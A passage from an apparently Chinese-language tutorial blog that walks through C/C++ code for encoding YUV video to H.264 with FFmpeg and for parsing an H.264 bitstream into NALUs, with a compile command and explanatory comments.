class="comment">//定义编码帧数</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>* out_file = <span class="string">&quot;ds.h264&quot;</span>;	                <span class="comment">//输出h264文件 </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*注册FFmpeg编解码器*/</span></span><br><span class="line">	<span class="built_in">av_register_all</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*初始化输出码流的AVFormatContext*/</span></span><br><span class="line">	pFormatCtx = <span class="built_in">avformat_alloc_context</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*从所编译的ffmpeg库支持的muxer中查找与文件名有关联的Container类型*/</span></span><br><span class="line">	fmt = <span class="built_in">av_guess_format</span>(<span class="literal">NULL</span>, out_file, <span class="literal">NULL</span>);</span><br><span class="line">	pFormatCtx-&gt;oformat = fmt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*打开输出文件路径*/</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">avio_open</span>(&amp;pFormatCtx-&gt;pb,out_file, AVIO_FLAG_READ_WRITE) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无法打开输出文件! \n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*创建输出码流的AVStream*/</span></span><br><span class="line">	video_st = <span class="built_in">avformat_new_stream</span>(pFormatCtx, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">//video_st-&gt;time_base.num = 1; </span></span><br><span class="line">	<span class="comment">//video_st-&gt;time_base.den = 25;  </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (video_st==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设定相关参数</span></span><br><span class="line">	pCodecCtx = video_st-&gt;codec;                   <span class="comment">//编解码器</span></span><br><span class="line">	pCodecCtx-&gt;codec_id = fmt-&gt;video_codec;        <span class="comment">//编解码器id</span></span><br><span class="line">	pCodecCtx-&gt;codec_type = AVMEDIA_TYPE_VIDEO;    <span class="comment">//编解码器类型</span></span><br><span class="line">	pCodecCtx-&gt;pix_fmt = AV_PIX_FMT_YUV420P;       <span class="comment">//帧格式</span></span><br><span class="line">	pCodecCtx-&gt;width = in_w;                       <span class="comment">//宽度</span></span><br><span class="line">	pCodecCtx-&gt;height = in_h;                      <span class="comment">//高度</span></span><br><span class="line">	pCodecCtx-&gt;bit_rate = <span class="number">400000</span>;                  <span class="comment">//比特率</span></span><br><span class="line">	pCodecCtx-&gt;gop_size=<span class="number">250</span>;                       <span class="comment">//连续的画面组大小</span></span><br><span class="line"></span><br><span class="line">	pCodecCtx-&gt;time_base.num = <span class="number">1</span>;                  <span class="comment">//time_base分子</span></span><br><span class="line">	pCodecCtx-&gt;time_base.den = <span class="number">25</span>;                 <span class="comment">//time_base分母</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//H264</span></span><br><span class="line">	<span class="comment">//pCodecCtx-&gt;me_range = 16;                    //运动侦测的半径</span></span><br><span class="line">	<span class="comment">//pCodecCtx-&gt;max_qdiff = 4;                    //最大量化因子变化量</span></span><br><span class="line">	<span class="comment">//pCodecCtx-&gt;qcompress = 0.6;                  //量化器压缩比率</span></span><br><span class="line">	pCodecCtx-&gt;qmin = <span class="number">10</span>;                          <span class="comment">//最小质量</span></span><br><span class="line">	pCodecCtx-&gt;qmax = <span class="number">51</span>;                          <span class="comment">//最大质量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//可选参数</span></span><br><span class="line">	pCodecCtx-&gt;max_b_frames=<span class="number">3</span>;                     <span class="comment">//最大b帧数</span></span><br><span class="line"></span><br><span class="line">	AVDictionary *param = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//H.264</span></span><br><span class="line">	<span class="keyword">if</span>(pCodecCtx-&gt;codec_id == AV_CODEC_ID_H264) &#123;</span><br><span class="line">		<span class="built_in">av_dict_set</span>(&amp;param, <span class="string">&quot;preset&quot;</span>, <span class="string">&quot;slow&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">av_dict_set</span>(&amp;param, <span class="string">&quot;tune&quot;</span>, <span class="string">&quot;zerolatency&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="comment">//av_dict_set(&amp;param, &quot;profile&quot;, &quot;main&quot;, 0);</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//H.265</span></span><br><span class="line">	<span class="keyword">if</span>(pCodecCtx-&gt;codec_id == AV_CODEC_ID_H265)&#123;</span><br><span class="line">		<span class="built_in">av_dict_set</span>(&amp;param, <span class="string">&quot;preset&quot;</span>, <span class="string">&quot;ultrafast&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">av_dict_set</span>(&amp;param, <span class="string">&quot;tune&quot;</span>, <span class="string">&quot;zero-latency&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//调试函数,输出文件的音、视频流的基本信息</span></span><br><span class="line">	<span class="built_in">av_dump_format</span>(pFormatCtx, <span class="number">0</span>, out_file, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	pCodec = <span class="built_in">avcodec_find_encoder</span>(pCodecCtx-&gt;codec_id);</span><br><span class="line">	<span class="keyword">if</span> (!pCodec)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无法找到编码器! \n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">avcodec_open2</span>(pCodecCtx, pCodec,&amp;param) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无法打开编码器! \n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分配AVFrame结构体</span></span><br><span class="line">	pFrame = <span class="built_in">av_frame_alloc</span>();</span><br><span class="line">	picture_size = <span class="built_in">avpicture_get_size</span>(pCodecCtx-&gt;pix_fmt, pCodecCtx-&gt;width, pCodecCtx-&gt;height);</span><br><span class="line">	picture_buf = (<span class="type">uint8_t</span> *)<span class="built_in">av_malloc</span>(picture_size);</span><br><span class="line">	<span class="built_in">avpicture_fill</span>((AVPicture *)pFrame, picture_buf, pCodecCtx-&gt;pix_fmt, pCodecCtx-&gt;width, pCodecCtx-&gt;height);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//写文件头</span></span><br><span class="line">	<span class="built_in">avformat_write_header</span>(pFormatCtx,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">av_new_packet</span>(&amp;pkt,picture_size);</span><br><span class="line"></span><br><span class="line">	y_size = pCodecCtx-&gt;width * pCodecCtx-&gt;height;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;framenum; i++)&#123;</span><br><span class="line">		<span class="comment">//读原始YUV数据</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">fread</span>(picture_buf, <span class="number">1</span>, y_size*<span class="number">3</span>/<span class="number">2</span>, in_file) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;读取原始数据失败! \n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">feof</span>(in_file))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		pFrame-&gt;data[<span class="number">0</span>] = picture_buf;              <span class="comment">// Y</span></span><br><span class="line">		pFrame-&gt;data[<span class="number">1</span>] = picture_buf+ y_size;      <span class="comment">// U </span></span><br><span class="line">		pFrame-&gt;data[<span class="number">2</span>] = picture_buf+ y_size*<span class="number">5</span>/<span class="number">4</span>;  <span class="comment">// V</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//PTS</span></span><br><span class="line">		pFrame-&gt;pts=i*(video_st-&gt;time_base.den)/((video_st-&gt;time_base.num)*<span class="number">25</span>);</span><br><span class="line">		<span class="type">int</span> got_picture=<span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//编码部分</span></span><br><span class="line">		<span class="type">int</span> ret = <span class="built_in">avcodec_encode_video2</span>(pCodecCtx, &amp;pkt,pFrame, &amp;got_picture);</span><br><span class="line">		<span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;编码失败! \n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (got_picture==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;成功编码！当前帧: %5d\t大小:%5d\n&quot;</span>,framecnt,pkt.size);</span><br><span class="line">			framecnt++;</span><br><span class="line">			pkt.stream_index = video_st-&gt;index;</span><br><span class="line">			ret = <span class="built_in">av_write_frame</span>(pFormatCtx, &amp;pkt);</span><br><span class="line">			<span class="built_in">av_free_packet</span>(&amp;pkt);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//输出编码器中剩余的AVPacket</span></span><br><span class="line">	<span class="type">int</span> ret = <span class="built_in">flush_encoder</span>(pFormatCtx,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;更新编码器失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//写文件尾</span></span><br><span class="line">	<span class="built_in">av_write_trailer</span>(pFormatCtx);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放内存空间</span></span><br><span class="line">	<span class="keyword">if</span> (video_st)&#123;</span><br><span class="line">		<span class="built_in">avcodec_close</span>(video_st-&gt;codec);</span><br><span class="line">		<span class="built_in">av_free</span>(pFrame);</span><br><span class="line">		<span class="built_in">av_free</span>(picture_buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">avio_close</span>(pFormatCtx-&gt;pb);</span><br><span class="line">	<span class="built_in">avformat_free_context</span>(pFormatCtx);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//关闭文件</span></span><br><span class="line">	<span class="built_in">fclose</span>(in_file);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码在MinGW命令行下的编译命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g++ h264_encoder.cpp -g -o h264_encoder.exe \</span><br><span class="line">-I /usr/local/include -L /usr/local/lib \</span><br><span class="line">-lavformat -lavcodec -lavutil</span><br></pre></td></tr></table></figure>

<h2 id="码流解析"><a href="#码流解析" class="headerlink" title="码流解析"></a>码流解析</h2><p>H.264原始码流由一个一个的NALU组成，该程序通过从码流中搜索0x000001和0x00000001，分离出NALU，然后再分析NALU的各个字段，从而达到H.264码流解析作用。</p>
<p>H.264码流解析代码在这里给出，并在关键部分添加简单注释：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * simplest h264 parser</span></span><br><span class="line"><span class="comment"> * H.264 stream analysis program. </span></span><br><span class="line"><span class="comment"> * learned from https://github.com/leixiaohua1020/</span></span><br><span class="line"><span class="comment"> * It can parse H.264 bitstream and analysis NALU of stream.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//H.264码流基本单元NALU类型、优先级及结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">	NALU_TYPE_SLICE    = <span class="number">1</span>,</span><br><span class="line">	NALU_TYPE_DPA      = <span class="number">2</span>,</span><br><span class="line">	NALU_TYPE_DPB      = <span class="number">3</span>,</span><br><span class="line">	NALU_TYPE_DPC      = <span class="number">4</span>,</span><br><span class="line">	NALU_TYPE_IDR      = <span class="number">5</span>,</span><br><span class="line">	NALU_TYPE_SEI      = <span class="number">6</span>,</span><br><span class="line">	NALU_TYPE_SPS      = <span class="number">7</span>,</span><br><span class="line">	NALU_TYPE_PPS      = <span class="number">8</span>,</span><br><span class="line">	NALU_TYPE_AUD      = <span class="number">9</span>,</span><br><span class="line">	NALU_TYPE_EOSEQ    = <span class="number">10</span>,</span><br><span class="line">	NALU_TYPE_EOSTREAM = <span class="number">11</span>,</span><br><span class="line">	NALU_TYPE_FILL     = <span class="number">12</span>,</span><br><span class="line">&#125; NaluType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">	NALU_PRIORITY_DISPOSABLE = <span class="number">0</span>,</span><br><span class="line">	NALU_PRIRITY_LOW         = <span class="number">1</span>,</span><br><span class="line">	NALU_PRIORITY_HIGH       = <span class="number">2</span>,</span><br><span class="line">	NALU_PRIORITY_HIGHEST    = <span class="number">3</span></span><br><span class="line">&#125; NaluPriority;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> startcodeprefix_len;      <span class="comment">//参数集</span></span><br><span class="line">	<span class="type">unsigned</span> len;                 <span class="comment">//NALU长度</span></span><br><span class="line">	<span class="type">unsigned</span> max_size;            <span class="comment">//NALU缓存大小</span></span><br><span class="line">	<span class="type">int</span> forbidden_bit;            <span class="comment">//禁止比特，通常为false</span></span><br><span class="line">	<span class="type">int</span> nal_reference_idc;        <span class="comment">//NALU_PRIORITY_xxxx</span></span><br><span class="line">	<span class="type">int</span> nal_unit_type;            <span class="comment">//NALU_TYPE_xxxx    </span></span><br><span class="line">	<span class="type">char</span> *buf;                    <span class="comment">//包括EBSP后首字节</span></span><br><span class="line">&#125; NALU_t;</span><br><span class="line"></span><br><span class="line">FILE *h264bitstream = <span class="literal">NULL</span>;                <span class="comment">//比特流文件</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> info2=<span class="number">0</span>, info3=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//找开始比特</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">FindStartCode2</span> <span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Buf)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(Buf[<span class="number">0</span>]!=<span class="number">0</span> || Buf[<span class="number">1</span>]!=<span class="number">0</span> || Buf[<span class="number">2</span>] !=<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">FindStartCode3</span> <span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Buf)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(Buf[<span class="number">0</span>]!=<span class="number">0</span> || Buf[<span class="number">1</span>]!=<span class="number">0</span> || Buf[<span class="number">2</span>] !=<span class="number">0</span> || Buf[<span class="number">3</span>] !=<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理字节流格式的码流</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetAnnexbNALU</span> <span class="params">(NALU_t *nalu)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> StartCodeFound, rewind;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *Buf;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((Buf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">calloc</span> (nalu-&gt;max_size , <span class="built_in">sizeof</span>(<span class="type">char</span>))) == <span class="literal">NULL</span>) </span><br><span class="line">		<span class="built_in">printf</span> (<span class="string">&quot;码流处理: 无法分配内存空间！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	nalu-&gt;startcodeprefix_len=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">3</span> != <span class="built_in">fread</span> (Buf, <span class="number">1</span>, <span class="number">3</span>, h264bitstream))&#123;</span><br><span class="line">		<span class="built_in">free</span>(Buf);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	info2 = <span class="built_in">FindStartCode2</span> (Buf);</span><br><span class="line">	<span class="keyword">if</span>(info2 != <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="number">1</span> != <span class="built_in">fread</span>(Buf+<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, h264bitstream))&#123;</span><br><span class="line">			<span class="built_in">free</span>(Buf);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		info3 = <span class="built_in">FindStartCode3</span> (Buf);</span><br><span class="line">		<span class="keyword">if</span> (info3 != <span class="number">1</span>)&#123; </span><br><span class="line">			<span class="built_in">free</span>(Buf);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			pos = <span class="number">4</span>;</span><br><span class="line">			nalu-&gt;startcodeprefix_len = <span class="number">4</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		nalu-&gt;startcodeprefix_len = <span class="number">3</span>;</span><br><span class="line">		pos = <span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	StartCodeFound = <span class="number">0</span>;</span><br><span class="line">	info2 = <span class="number">0</span>;</span><br><span class="line">	info3 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (!StartCodeFound)&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">feof</span> (h264bitstream))&#123;</span><br><span class="line">			nalu-&gt;len = (pos<span class="number">-1</span>)-nalu-&gt;startcodeprefix_len;</span><br><span class="line">			<span class="built_in">memcpy</span> (nalu-&gt;buf, &amp;Buf[nalu-&gt;startcodeprefix_len], nalu-&gt;len);     </span><br><span class="line">			nalu-&gt;forbidden_bit = nalu-&gt;buf[<span class="number">0</span>] &amp; <span class="number">0x80</span>; <span class="comment">//1 bit(10000000)</span></span><br><span class="line">			nalu-&gt;nal_reference_idc = nalu-&gt;buf[<span class="number">0</span>] &amp; <span class="number">0x60</span>; <span class="comment">// 2 bit(01100000)</span></span><br><span class="line">			nalu-&gt;nal_unit_type = (nalu-&gt;buf[<span class="number">0</span>]) &amp; <span class="number">0x1f</span>;<span class="comment">// 5 bit(00011111)</span></span><br><span class="line">			<span class="built_in">free</span>(Buf);</span><br><span class="line">			<span class="keyword">return</span> pos<span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Buf[pos++] = <span class="built_in">fgetc</span> (h264bitstream);</span><br><span class="line">		info3 = <span class="built_in">FindStartCode3</span>(&amp;Buf[pos<span class="number">-4</span>]);</span><br><span class="line">		<span class="keyword">if</span>(info3 != <span class="number">1</span>)</span><br><span class="line">			info2 = <span class="built_in">FindStartCode2</span>(&amp;Buf[pos<span class="number">-3</span>]);</span><br><span class="line">		StartCodeFound = (info2 == <span class="number">1</span> || info3 == <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这里找到另一个开始比特</span></span><br><span class="line"></span><br><span class="line">	rewind = (info3 == <span class="number">1</span>)? <span class="number">-4</span> : <span class="number">-3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">fseek</span> (h264bitstream, rewind, SEEK_CUR))&#123;</span><br><span class="line">		<span class="built_in">free</span>(Buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;码流处理: 无法设置文件指针！&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这里得到完整NALU, 下一个开始比特在buf中。</span></span><br><span class="line">	</span><br><span class="line">	nalu-&gt;len = (pos+rewind)-nalu-&gt;startcodeprefix_len;</span><br><span class="line">	<span class="built_in">memcpy</span> (nalu-&gt;buf, &amp;Buf[nalu-&gt;startcodeprefix_len], nalu-&gt;len);<span class="comment">//</span></span><br><span class="line">	nalu-&gt;forbidden_bit = nalu-&gt;buf[<span class="number">0</span>] &amp; <span class="number">0x80</span>; <span class="comment">//1 bit</span></span><br><span class="line">	nalu-&gt;nal_reference_idc = nalu-&gt;buf[<span class="number">0</span>] &amp; <span class="number">0x60</span>; <span class="comment">// 2 bit</span></span><br><span class="line">	nalu-&gt;nal_unit_type = (nalu-&gt;buf[<span class="number">0</span>]) &amp; <span class="number">0x1f</span>;<span class="comment">// 5 bit</span></span><br><span class="line">	<span class="built_in">free</span>(Buf);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (pos+rewind);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//h264码流解析子函数，参数为码流文件路径</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">simplest_h264_parser</span><span class="params">(<span class="type">char</span> *url)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	NALU_t *n;</span><br><span class="line">	<span class="type">int</span> buffersize=<span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line">	FILE *myout=stdout;</span><br><span class="line"></span><br><span class="line">	h264bitstream=<span class="built_in">fopen</span>(url, <span class="string">&quot;rb+&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (h264bitstream==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件打开失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	n = (NALU_t*)<span class="built_in">calloc</span> (<span class="number">1</span>, <span class="built_in">sizeof</span> (NALU_t));</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NALU分配失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	n-&gt;max_size=buffersize;</span><br><span class="line">	n-&gt;buf = (<span class="type">char</span>*)<span class="built_in">calloc</span> (buffersize, <span class="built_in">sizeof</span> (<span class="type">char</span>));</span><br><span class="line">	<span class="keyword">if</span> (n-&gt;buf == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">free</span> (n);</span><br><span class="line">		<span class="built_in">printf</span> (<span class="string">&quot;NALU分配: n-&gt;buf&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> data_offset=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> nal_num=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;-----+-------- NALU Table ------+---------+\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; NUM |    POS  |    IDC |  TYPE |   LEN   |\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;-----+---------+--------+-------+---------+\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">feof</span>(h264bitstream)) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> data_lenth;</span><br><span class="line">		data_lenth=<span class="built_in">GetAnnexbNALU</span>(n);</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span> type_str[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">		<span class="keyword">switch</span>(n-&gt;nal_unit_type)&#123;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_SLICE:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;SLICE&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_DPA:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;DPA&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_DPB:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;DPB&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_DPC:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;DPC&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_IDR:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;IDR&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_SEI:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;SEI&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_SPS:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;SPS&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_PPS:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;PPS&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_AUD:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;AUD&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_EOSEQ:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;EOSEQ&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_EOSTREAM:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;EOSTREAM&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_TYPE_FILL:<span class="built_in">sprintf</span>(type_str,<span class="string">&quot;FILL&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">char</span> idc_str[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">		<span class="keyword">switch</span>(n-&gt;nal_reference_idc&gt;&gt;<span class="number">5</span>)&#123;</span><br><span class="line">			<span class="keyword">case</span> NALU_PRIORITY_DISPOSABLE:<span class="built_in">sprintf</span>(idc_str,<span class="string">&quot;DISPOS&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_PRIRITY_LOW:<span class="built_in">sprintf</span>(idc_str,<span class="string">&quot;LOW&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_PRIORITY_HIGH:<span class="built_in">sprintf</span>(idc_str,<span class="string">&quot;HIGH&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> NALU_PRIORITY_HIGHEST:<span class="built_in">sprintf</span>(idc_str,<span class="string">&quot;HIGHEST&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">fprintf</span>(myout,<span class="string">&quot;%5d| %8d| %7s| %6s| %8d|\n&quot;</span>,nal_num,data_offset,idc_str,type_str,n-&gt;len);</span><br><span class="line"></span><br><span class="line">		data_offset=data_offset+data_lenth;</span><br><span class="line"></span><br><span class="line">		nal_num++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放空间</span></span><br><span class="line">	<span class="keyword">if</span> (n)&#123;</span><br><span class="line">		<span class="keyword">if</span> (n-&gt;buf)&#123;</span><br><span class="line">			<span class="built_in">free</span>(n-&gt;buf);</span><br><span class="line">			n-&gt;buf=<span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span> (n);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span 